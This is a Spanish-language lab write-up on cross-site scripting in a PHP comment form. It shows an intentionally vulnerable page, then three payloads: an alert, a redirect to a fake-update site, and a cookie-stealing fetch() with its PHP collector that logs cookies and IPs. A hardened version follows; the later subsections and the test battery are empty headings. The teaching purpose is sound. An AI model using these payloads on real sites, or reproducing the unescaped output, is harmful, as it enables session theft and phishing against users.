# 2. Documentación de vulnerabilidades de inyección de datos de entrada

En esta documentación se realiza la **Explotación y Mitigación de Cross-Site Scripting (XSS)**.  

---

## 2.1 Código vulnerable

A continuación se muestra el contenido del archivo comment.php que es vulnberable.

![PHP](./images/apartado_dos/commentphp.png)

**`comment.php`**
```
<?php
// Activar errores en entorno de prácticas (opcional)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$comment = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // SIN SEGURIDAD: se guarda el comentario tal cual
    $comment = $_POST['comment'] ?? '';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Comentarios INSEGUROS</title>
</head>
<body>
    <h1>Comentarios (versión insegura)</h1>

    <form method="post">
        <label for="comment">Comentario:</label><br>
        <!-- SIN htmlspecialchars: se muestra el contenido sin escapar -->
        <textarea name="comment" id="comment" rows="4" cols="50"><?= $comment ?></textarea><br>
        <button type="submit">Enviar</button>
    </form>

    <?php if ($comment !== ''): ?>
        <h2>Comentario recibido (SIN sanitizar)</h2>
        <!-- Aquí también se imprime directamente, vulnerable a XSS -->
        <p><?= $comment ?></p>
    <?php endif; ?>
</body>
</html>
```
---

### 2.1.1 Explotación 1 - XSS clásico

A continuación se muestra la explotación 1.

![XPLOIT1](./images/apartado_dos/xploit1.png)

```
<script>alert('Vulnerabilidad XSS!')</script>
<h2 style="color:red;">Explotación 1</h2>
```
---

### 2.1.2 Explotación 2 - Redirección maliciosa

A continuación se muestra la explotación 2.

![XPLOIT2](./images/apartado_dos/xploit2.png)

```
<script>window.location='https://fakeupdate.net/win10ue/'</script>
<h2 style="color:red;">Explotación 2</h2>
```
---

### 2.1.3 Explotación 3 - Robo de cookies (Cookie Stealing)

A continuación se muestra la explotación 3 **`./www/cookieStealer/index.php`**.

![XPLOIT3](./images/apartado_dos/xploit3.png)

```
<?php
// Obtener la fecha actual
$date = date("Y/m/d H:i:s");

// Obtener la dirección IP, User Agent y Referer
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'No User Agent';
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';

// Obtener el parámetro 'cookie' de la URL
$cookie = isset($_GET['cookie']) ? $_GET['cookie'] : 'No Cookie Provided';

// Escapar las variables para evitar inyecciones de código
$cookie = htmlspecialchars($cookie, ENT_QUOTES, 'UTF-8');
$user_agent = htmlspecialchars($user_agent, ENT_QUOTES, 'UTF-8');
$referer = htmlspecialchars($referer, ENT_QUOTES, 'UTF-8');

// Intentar abrir el archivo de registro
$file = fopen("cookies.txt", "a");

if ($file === false) {
    // Si no se puede abrir el archivo, responder con error
    echo json_encode(["status" => 500, "message" => "Error opening file"]);
    exit();
}

// Escribir la información en el archivo
fwrite($file, "[+] Date: {$date}\n[+] IP: {$ip}\n[+] UserAgent: {$user_agent}\n[+] Referer: {$referer}\n[+] Cookies: {$cookie}\n---\n");

// Cerrar el archivo
fclose($file);

// Responder con un JSON de éxito
echo json_encode(["status" => 200]);
?>
```
```
<script>
fetch("http://localhost/cookieStealer/index.php?cookie=" + document.cookie);
</script>
<h2 style="color:red;">Explotación 3</h2>

```
---

## 2.2 Mitigación

**`comment.php`**
```
<?php
// ==========================
// CONFIGURACIÓN DE ERRORES
// ==========================
ini_set('display_errors', 1);
error_reporting(E_ALL);

// ==========================
// INICIAR SESIÓN (CSRF)
// ==========================
session_start();

// Generar token CSRF si no existe
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// ==========================
// VARIABLES
// ==========================
$comment = '';
$error = '';
$success = '';

// ==========================
// PROCESAMIENTO DEL FORMULARIO
// ==========================
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // ==========================
    // 1. VERIFICACIÓN CSRF
    // ==========================
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        $error = "Error: Token CSRF inválido.";
    } else {

        // ==========================
        // 2️. MITIGACIÓN 1:
        // USO DE filter_input()
        // ==========================
        $comment = filter_input(INPUT_POST, 'comment', FILTER_UNSAFE_RAW);

        if ($comment === null) {
            $comment = '';
        }

        // Eliminar espacios al inicio y final
        $comment = trim($comment);

        // ==========================
        // 3️. MITIGACIÓN 2:
        // VALIDACIÓN DE ENTRADA
        // ==========================

        $length = mb_strlen($comment, 'UTF-8');

        if ($length === 0) {
            $error = "El comentario no puede estar vacío.";
        } elseif ($length > 500) {
            $error = "El comentario no puede superar los 500 caracteres.";
        }
        // Permitir letras, números, espacios y puntuación básica
        elseif (!preg_match('/^[\p{L}\p{N}\s.,!?¡¿()@#%&\-]*$/u', $comment)) {
            $error = "El comentario contiene caracteres no permitidos.";
        }
        else {

            // ==========================
            // 4️. MITIGACIÓN 3:
            // SANITIZAR CON htmlspecialchars()
            // ==========================
            $comment = htmlspecialchars(
                $comment,
                ENT_QUOTES | ENT_SUBSTITUTE,
                'UTF-8'
            );

            $success = "Comentario publicado correctamente.";
        }
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Comentarios Seguros</title>
</head>
<body>

<h1>Formulario seguro con 3 mitigaciones</h1>

<?php if ($error): ?>
    <p style="color:red;">
        <?= htmlspecialchars($error, ENT_QUOTES, 'UTF-8') ?>
    </p>
<?php endif; ?>

<?php if ($success): ?>
    <p style="color:green;">
        <?= htmlspecialchars($success, ENT_QUOTES, 'UTF-8') ?>
    </p>
<?php endif; ?>

<form method="post">

    <label>Comentario:</label><br>

    <textarea name="comment" rows="4" cols="50"></textarea><br><br>

    <!-- Token CSRF -->
    <input type="hidden"
           name="csrf_token"
           value="<?= htmlspecialchars($_SESSION['csrf_token'], ENT_QUOTES, 'UTF-8') ?>">

    <button type="submit">Enviar</button>

</form>

<?php if ($success): ?>
    <h2>Comentario recibido:</h2>
    <p><?= $comment ?></p>
<?php endif; ?>

</body>
</html>
```
---

### 2.2.1 MITIGACIÓN 1 — Uso de filter_input()

**`comment.php`**

---

### 2.2.2 MITIGACIÓN 2 — Validación de entrada

**`comment.php`**

---

### 2.2.3 MITIGACIÓN 3 — Sanitización con htmlspecialchars()

**`comment.php`**

---

## 2.3 BATERÍA DE PRUEBAS
